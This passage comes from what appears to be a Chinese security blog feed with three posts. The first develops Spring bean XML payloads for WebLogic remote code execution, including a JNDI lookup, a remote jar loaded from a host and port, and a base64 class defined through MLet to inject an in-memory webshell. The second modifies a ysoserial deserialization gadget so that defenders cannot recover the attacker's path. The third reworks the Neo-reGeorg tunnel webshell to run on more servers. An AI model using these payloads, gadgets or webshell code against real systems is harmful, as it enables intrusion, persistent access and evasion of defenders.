rel="noopener">官方文档</a>时,我着重关注如下涉及方法调用的标签和属性。</p><table><thead><tr><th>标签/属性</th><th>分析</th></tr></thead><tbody><tr><td>&lt;bean&gt;&lt;constructor-arg&gt;&lt;/constructor-arg&gt;&lt;/bean&gt;</td><td>调用构造器</td></tr><tr><td>&lt;property&gt;</td><td>创建bean时，可调setter方法</td></tr><tr><td>init-method</td><td>bean初始化时，可以调用一个无参方法</td></tr><tr><td>destroy-method</td><td>bean被销毁时，可以调用一个无参方法</td></tr><tr><td>lookup-method</td><td>可以控制返回结果，但是weblogic没有cglib库,这个标签没发用</td></tr><tr><td>replace-method</td><td>任意方法替换，可以替换某些方法的实现逻辑为另一个方法，但是xml无法定义替换逻辑</td></tr><tr><td>factory-method</td><td>通过调用工厂方法创建bean，可调用返回值不为void的有参方法，静态和非静态都可以</td></tr></tbody></table><p>很显然factory-method非常符合我们的要求,构造起payload就轻松多了。</p><h4 id="2-1-jndi"><a href="#2-1-jndi" class="headerlink" title="2.1 jndi"></a>2.1 jndi</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"javax.naming.InitialContext"</span> <span class="attr">factory-method</span>=<span class="string">"doLookup"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">"java.lang.String"</span> <span class="attr">value</span>=<span class="string">"ldap://127.0.0.1:1664/exp"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>jndi有jdk版本限制，so继续优化。</p><h4 id="2-2-loadjar"><a href="#2-2-loadjar" class="headerlink" title="2.2 loadjar"></a>2.2 loadjar</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"classLoader"</span> <span class="attr">class</span>=<span class="string">"java.net.URLClassLoader"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span> <span class="attr">type</span>=<span class="string">"java.net.URL"</span>&gt;</span>http://127.0.0.1:1664/exp.jar<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"clazz"</span> <span class="attr">factory-bean</span>=<span class="string">"classLoader"</span> <span class="attr">factory-method</span>=<span class="string">"loadClass"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">"java.lang.String"</span> <span class="attr">value</span>=<span class="string">"InjectMemshell"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">factory-bean</span>=<span class="string">"clazz"</span> <span class="attr">factory-method</span>=<span class="string">"newInstance"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>加载class要通用很多，只是需要搭一个http服务比较繁琐，利用上不是很方便，so继续优化。</p><h4 id="2-3-bcel"><a href="#2-3-bcel" class="headerlink" title="2.3 bcel"></a>2.3 bcel</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(<span class="string">"$$BCEL$$$..."</span>).newInstance();</span><br></pre></td></tr></table></figure><p>代码转换为spring bean:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd "</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"classloader"</span> <span class="attr">class</span>=<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"clazz"</span> <span class="attr">factory-bean</span>=<span class="string">"classloader"</span> <span class="attr">factory-method</span>=<span class="string">"loadClass"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">"java.lang.String"</span> <span class="attr">value</span>=<span class="string">"$$BCEL$$$......"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">factory-bean</span>=<span class="string">"clazz"</span> <span class="attr">factory-method</span>=<span class="string">"newInstance"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有的JDK版本下bcel被去掉了，so还得继续优化。</p><h4 id="2-4-java-lang-ClassLoader-defineClass"><a href="#2-4-java-lang-ClassLoader-defineClass" class="headerlink" title="2.4 java.lang.ClassLoader#defineClass"></a>2.4 java.lang.ClassLoader#defineClass</h4><p>java下执行代码要说兼容性最好，当然还得是<code>java.lang.ClassLoader#defineClass</code>。接下来只需要思考如何把下面的代码，用sprng bean来表达即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] clazzBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;-<span class="number">54</span>,-<span class="number">2</span>,-<span class="number">70</span>,-<span class="number">66</span>,<span class="number">0</span>,......&#125;;</span><br><span class="line">Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="string">"defineClass"</span>, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Class clazz = (Class)defineClass.invoke(<span class="keyword">new</span> MLet(),clazzBytes,<span class="number">0</span>,clazzBytes.length);</span><br><span class="line">clazz.newInstance();</span><br></pre></td></tr></table></figure><p><strong>通过研究发现一个小细节，spring bean可以调用私有方法无需反射。这就很方便了，可以直接调用当前class及其所有父类的方法。</strong></p><p>构造过程还遇到一个问题，使用<code>&lt;list&gt;</code>标签存储class字节码导致payload要大很多。当然有的人会想的用<code>weblogic.utils.Hex</code>来编码，其实Base64编码体积更小。由于不同版本JDK下Base64 api有变化，为了通用我打算去weblogic下找，并着重考虑<code>weblogic.*</code>包名下的。最后找到了如下两个，不过<code>1</code>没有被当前classloader加载，只能选择<code>2</code>。</p><ol><li>weblogic.servlet.utils.Base64</li><li>weblogic.utils.encoders.BASE64Decoder</li></ol><p>最终优化如下，大概就是我目前觉得最好的payload了。如果你有更好的payload欢迎留言交流。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd "</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"decoder"</span> <span class="attr">class</span>=<span class="string">"weblogic.utils.encoders.BASE64Decoder"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"clazzBytes"</span> <span class="attr">factory-bean</span>=<span class="string">"decoder"</span> <span class="attr">factory-method</span>=<span class="string">"decodeBuffer"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">"java.lang.String"</span> <span class="attr">value</span>=<span class="string">"yv66vgAAA......"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"classLoader"</span> <span class="attr">class</span>=<span class="string">"javax.management.loading.MLet"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"clazz"</span> <span class="attr">factory-bean</span>=<span class="string">"classLoader"</span> <span class="attr">factory-method</span>=<span class="string">"defineClass"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">"[B"</span> <span class="attr">ref</span>=<span class="string">"clazzBytes"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">"int"</span> <span class="attr">value</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">"int"</span> <span class="attr">value</span>=<span class="string">"10692"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">factory-bean</span>=<span class="string">"clazz"</span> <span class="attr">factory-method</span>=<span class="string">"newInstance"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/articles/2021/some-extensions-of-spring-bean-rce-under-weblogic/inject-memshell-by-spring-bean.png" alt="通过spring bean注入内存马"></p><p>顺便写一个woodpecker插件留以后备用，美如画。</p><p><img src="/articles/2021/some-extensions-of-spring-bean-rce-under-weblogic/woodpecker-spring-bean-payload-generator.png" alt="woodpecker spring bean rce payload生成插件"></p><h2 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h2><ul><li><a href="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#beans-dependencies" target="_blank" rel="noopener">https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#beans-dependencies</a></li><li><a href="https://www.cnblogs.com/happyflyingpig/p/8047441.html" target="_blank" rel="noopener">spring bean中子元素lookup-method和replaced-method</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有一个gadget正在泄露你的ID</title>
      <link href="/articles/2021/a-gadget-is-secretly-leaking-your-id/"/>
      <url>/articles/2021/a-gadget-is-secretly-leaking-your-id/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在Java反序列化漏洞炙手可热的当下，许多自动化工具都在使用ysoserial的gadget。而这些gadget当中，有一个gadget正在偷偷泄露你的id — <code>BeanShell1</code></p><p><img src="/articles/2021/a-gadget-is-secretly-leaking-your-id/beanshell1-leaks-the-current-running-path.png" alt="BeanShell1泄露当前运行路径"></p><p>这意味着经常使用shiro批量爆破gadget工具的小伙伴，蓝队同学可能解密下paylaod就能得到你的id了。</p><h2 id="0x02-定位信息泄露属性"><a href="#0x02-定位信息泄露属性" class="headerlink" title="0x02 定位信息泄露属性"></a>0x02 定位信息泄露属性</h2><p>通过使用<a href="https://github.com/c0ny1/java-object-searcher" target="_blank" rel="noopener">java-object-searcher</a>搜索，找到敏感信息存储在<code>bsh.NameSpace</code>类的<code>variables</code>属性中。</p><p><img src="/articles/2021/a-gadget-is-secretly-leaking-your-id/store-the-attributes-of-the-current-running-path.png" alt="存储当前运行路径的属性"></p><p>通过阅读该类代码，发现只有<code>setTypedVariable</code>方法对<code>variables</code>进行<code>put</code>操作，在该处下断点。</p><p>重新调式，看到<code>当前运行路径</code>被put进来后，顺着调用堆栈往上分析。发现<code>BeanShell1</code>在<code>Interpreter</code>对象初始化时，调用<code>bsh.Interpreter#initRootSystemObject</code>设置了<code>bsh.cwd</code>值为<code>当前运行路径</code>，最终它被保存到了序列化数据中。</p><p><img src="/articles/2021/a-gadget-is-secretly-leaking-your-id/get-the-current-running-path.png" alt="获取当前运行路径"></p><h2 id="0x03-构造干净的BeanShell1"><a href="#0x03-构造干净的BeanShell1" class="headerlink" title="0x03 构造干净的BeanShell1"></a>0x03 构造干净的BeanShell1</h2><p>既然<code>Interpreter</code>对象通过<code>setu</code>方法存储了敏感信息，那么我们同样可以调用该方法将敏感信息覆盖掉，防止信息泄露。</p><p>所以要构造一个干净的BeanShell1 gadget，只需要在<code>Interpreter</code>对象创建后反射调用<code>setu</code>方法覆盖<code>bsh.cwd</code>值为<code>.</code>(第13-15行代码)即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(&#123; <span class="string">"rawtypes"</span>, <span class="string">"unchecked"</span> &#125;)</span><br><span class="line"><span class="meta">@Dependencies</span>(&#123; <span class="string">"org.beanshell:bsh:2.0b5"</span> &#125;)</span><br><span class="line"><span class="meta">@Authors</span>(&#123;Authors.PWNTESTER, Authors.CSCHNEIDER4711&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanShell1</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">PriorityQueue</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PriorityQueue <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// BeanShell payload</span></span><br><span class="line">        String payload = BeanShellUtil.getPayload(command);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create Interpreter</span></span><br><span class="line">        Interpreter i = <span class="keyword">new</span> Interpreter();</span><br><span class="line">        <span class="comment">/***** 覆盖bsh.cwd,清空user.dir，防止信息泄露 *****/</span></span><br><span class="line">        Method setu = i.getClass().getDeclaredMethod(<span class="string">"setu"</span>,<span class="keyword">new</span> Class[]&#123;String.class,Object.class&#125;);</span><br><span class="line">    setu.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    setu.invoke(i,<span class="keyword">new</span> Object[]&#123;<span class="string">"bsh.cwd"</span>,<span class="string">"."</span>&#125;);</span><br><span class="line">    <span class="comment">/***********************************************/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Evaluate payload</span></span><br><span class="line">        i.eval(payload);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create InvocationHandler</span></span><br><span class="line">        XThis xt = <span class="keyword">new</span> XThis(i.getNameSpace(), i);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), <span class="string">"invocationHandler"</span>).get(xt);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create Comparator Proxy</span></span><br><span class="line">        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Comparator.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        Object[] queue = <span class="keyword">new</span> Object[] &#123;<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">        Reflections.setFieldValue(priorityQueue, <span class="string">"queue"</span>, queue);</span><br><span class="line">        Reflections.setFieldValue(priorityQueue, <span class="string">"size"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> priorityQueue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目前已经给<code>ysoserial</code>项目<a href="https://github.com/frohoff/ysoserial/pull/169" target="_blank" rel="noopener">pr</a>，等待官方修复。当然大家也可以使用我二次开发的<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker" target="_blank" rel="noopener">ysoserial-for-woopecker</a>。</p><p><img src="/articles/2021/a-gadget-is-secretly-leaking-your-id/pr.png" alt="给官方提的pr"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过加载class提高Neo-reGeorg兼容性</title>
      <link href="/articles/2021/improve-neo-regeorg-compatibility-by-loading-classes/"/>
      <url>/articles/2021/improve-neo-regeorg-compatibility-by-loading-classes/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>一大早就看到<code>L-codes</code>师傅发消息说，Neo-reGeorg jsp服务端又出现问题了，印象里已经不是一两次了。大部分都是兼容性问题，这次也不例外。</p><p><img src="/articles/2021/improve-neo-regeorg-compatibility-by-loading-classes/unable-to-compile-neo-regeorg.png" alt="在tomcat 5.5.9下的报错"></p><p>是时候设计一个一劳永逸的方案了。</p><h2 id="0x02-分析原因"><a href="#0x02-分析原因" class="headerlink" title="0x02 分析原因"></a>0x02 分析原因</h2><p>我们知道jsp从被访问到运行，经历如下阶段。</p><p><img src="/articles/2021/improve-neo-regeorg-compatibility-by-loading-classes/jsp-execution-process.png" alt="jsp执行流程"></p><p>本案例中发现tomcat work目录下已经存在了<code>tunnel_jsp.java</code>,但是没有<code>tunnel_jsp.class</code>，说明阶段1已经过。结合页面报错信息，在2阶段时Tomcat内置的编译器JDTCompiler，编译报错了。</p><p>检查<code>tunnel_jsp.java</code>代码并没有语法错误，尝试使用javac编译，编译成功！看来JDTCompiler与javac实现逻辑并不同，而且没有javac强大。</p><p><img src="/articles/2021/improve-neo-regeorg-compatibility-by-loading-classes/javac-compiles-through.png" alt="javac可以编译通过"></p><p>编译成功之后我再访问tunnel.jsp页面不再报错了。可见提高一个<code>.jsp</code>的兼容，无非就是让它在各个中间件下成功变成一个<code>.class</code>。而这个过程与具体中间件的<code>jsp转换器</code>的解析机制，<code>java编译器</code>的编译机制和<code>servlet-api</code>的版本息息相关。</p><p>那么我们是不是可以把Neo-reGeorg的服务端代码提取变成class字节码，然后jsp来加载和调用，来提高这个过程的成功率呢？。<strong>总之核心思想就是把尽可能多的业务逻辑变成最终可运行的java字节码，同时尽可能的减少jsp代码，少用api少用语法糖少用特性。</strong></p><h2 id="0x03-编码实现"><a href="#0x03-编码实现" class="headerlink" title="0x03 编码实现"></a>0x03 编码实现</h2><p>我们先来移植服务端模版代码为java代码。直接新建一个<code>NeoreGeorg.java</code>，将jsp中的方法直接copy,主体代码的移植需要注意2个问题。</p><p>第一、参数提炼问题。我们需要把模版变化的地方，提取出来作为参数，比如<code>X-CMD</code>这样的指令，<code>POST request read filed</code>这样的提示，Neo-reGorg需要通过随机替换它们实现流量加密。</p><p>第二、参数传递问题。参数可以通过构造方法或者自定义方法传递进来，但是这样要多写些反射代码。本着jsp代码越少越好原则，使用每个类都有的<code>equal(java.lang.Object)</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/L-codes/Neo-reGeorg/blob/46ecb6f106/templates/NeoreGeorg.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NeoreGeorg</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span>[] en;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">byte</span>[] de;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> HTTPCODE;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> READBUF;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> MAXREADSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 接收参数</span></span><br><span class="line">            Object[] args = (Object[]) obj;</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) args[<span class="number">0</span>];</span><br><span class="line">            HttpServletResponse response = (HttpServletResponse) args[<span class="number">1</span>];</span><br><span class="line">            en = (<span class="keyword">char</span>[])args[<span class="number">2</span>];</span><br><span class="line">            de = (<span class="keyword">byte</span>[])args[<span class="number">3</span>];</span><br><span class="line">            HTTPCODE = (Integer) args[<span class="number">4</span>];</span><br><span class="line">            READBUF = (Integer) args[<span class="number">5</span>];</span><br><span class="line">            MAXREADSIZE = (Integer) args[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">            ServletContext application = request.getSession().getServletContext();</span><br><span class="line">            Writer out = response.getWriter();</span><br><span class="line">            ......</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// Neo-reGorg主要流程代码。</span></span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   ....</span><br><span class="line">   <span class="comment">//其他方法照抄</span></span><br><span class="line">   ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了兼容更多的jdk版本我们这里选择使用1.5编译，同时为了class体积更小，可以使用<code>-g:none</code>去掉调试信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -cp tomcat-servlet-api.jar -g:none -source 1.5 -target 1.5 NeoreGeorg.java</span><br></pre></td></tr></table></figure><p>jsp部分很简单，定义一个classloader用于加载class，然后将该class newInstance进行调用。有二个点可以简单讲讲。</p><p>第一，class字节码的存储方式问题。本着少用api的原则，我直接用byte数组存储。当然如果字节码太多，可能会有<code>The code of method _jspService(...) is exceeding the 65535 bytes limit</code>报错问题，推荐用hex编码解决。</p><p>第二，全局存储class对象问题。推荐使用<code>application</code>对象，而不是<code>session</code>对象进行存储，否则遇到负载的情况就麻烦了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/L-codes/Neo-reGeorg/blob/46ecb6f106/templates/tunnel.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"sun.misc.BASE64Decoder"</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="keyword">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    Object[] args = <span class="keyword">new</span> Object[]&#123;</span><br><span class="line">            request, <span class="comment">//0</span></span><br><span class="line">            response, <span class="comment">//1</span></span><br><span class="line">            <span class="string">"BASE64 CHARSLIST"</span>.toCharArray(), <span class="comment">//2</span></span><br><span class="line">            <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;BASE64 ARRAYLIST&#125;,<span class="comment">//3</span></span><br><span class="line">            <span class="keyword">new</span> Integer(HTTPCODE),<span class="comment">//4</span></span><br><span class="line">            <span class="keyword">new</span> Integer(READBUF),<span class="comment">//5</span></span><br><span class="line">            <span class="keyword">new</span> Integer(MAXREADSIZE),<span class="comment">//6</span></span><br><span class="line">            <span class="string">"X-STATUS"</span>,<span class="comment">//7</span></span><br><span class="line">            <span class="string">"X-ERROR"</span>,<span class="comment">//8</span></span><br><span class="line">            <span class="string">"X-CMD"</span>,<span class="comment">//9</span></span><br><span class="line">            <span 